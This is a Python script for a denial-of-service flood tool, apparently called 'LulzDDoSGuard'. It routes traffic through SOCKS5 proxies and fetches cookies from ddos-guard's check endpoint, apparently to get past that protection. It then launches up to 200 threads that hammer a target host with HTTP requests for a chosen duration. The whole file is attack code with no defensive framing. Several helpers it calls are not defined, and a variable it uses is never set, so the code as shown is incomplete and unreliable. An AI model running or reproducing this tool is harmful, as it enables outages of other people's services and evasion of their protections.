import threading, sys, os, time, requests
from random import randint
from scapy.all import *

proxies = []
with open('proxies.txt', 'r') as proxy_file:
    [proxies.append(proxy_server.strip('\n')) for proxy_server in proxy_file.readlines()]

def flood():
    host = sys.argv[2]
    port = int(sys.argv[3])
    duration = sys.argv[4]

    stoptime = time.time() + int(duration)
    proxy = choice(proxies)
    
    session = createsession()
    session.post('https://check.ddos-guard.net/check.js')
    for key, value in session.cookies.items():
        session.cookies.set_cookie(requests.cookies.create_cookie(key, value))
        
    while time.time() < stoptime:
        try:
            headers = buildheaders(url)
            
            session.get(f'{"http" if port == 80 else "https"}://{url}:{port}/{buildblock(url)}', headers=headers, verify=False, timeout=(5, 2), allow_redirects=False, stream=False, proxies={'http': f'socks5://{proxy}', 'https': f'socks5://{proxy}'})
        except Exception:
            pass

if __name__ == '__main__':
    print('''
             /$$                 /$$           /$$$$$$$  /$$$$$$$   /$$$$$$   /$$$$$$   /$$$$$$  /$$   /$$  /$$$$$$  /$$$$$$$  /$$$$$$$ 
            | $$                | $$          | $$__  $$| $$__  $$ /$$__  $$ /$$__  $$ /$$__  $$| $$  | $$ /$$__  $$| $$__  $$| $$__  $$
            | $$       /$$   /$$| $$ /$$$$$$$$| $$  \ $$| $$  \ $$| $$  \ $$| $$  \__/| $$  \__/| $$  | $$| $$  \ $$| $$  \ $$| $$  \ $$
            | $$      | $$  | $$| $$|____ /$$/| $$  | $$| $$  | $$| $$  | $$|  $$$$$$ | $$ /$$$$| $$  | $$| $$$$$$$$| $$$$$$$/| $$  | $$
            | $$      | $$  | $$| $$   /$$$$/ | $$  | $$| $$  | $$| $$  | $$ \____  $$| $$|_  $$| $$  | $$| $$__  $$| $$__  $$| $$  | $$
            | $$      | $$  | $$| $$  /$$__/  | $$  | $$| $$  | $$| $$  | $$ /$$  \ $$| $$  \ $$| $$  | $$| $$  | $$| $$  \ $$| $$  | $$
            | $$$$$$$$|  $$$$$$/| $$ /$$$$$$$$| $$$$$$$/| $$$$$$$/|  $$$$$$/|  $$$$$$/|  $$$$$$/|  $$$$$$/| $$  | $$| $$  | $$| $$$$$$$/
            |________/ \______/ |__/|________/|_______/ |_______/  \______/  \______/  \______/  \______/ |__/  |__/|__/  |__/|_______/
    ''')

    try:
        threadcount = 200 if int(sys.argv[1]) > 200 else int(sys.argv[1])

        for _ in range(threadcount):
            threading.Thread(target=flood).start()
    except:
        print('error')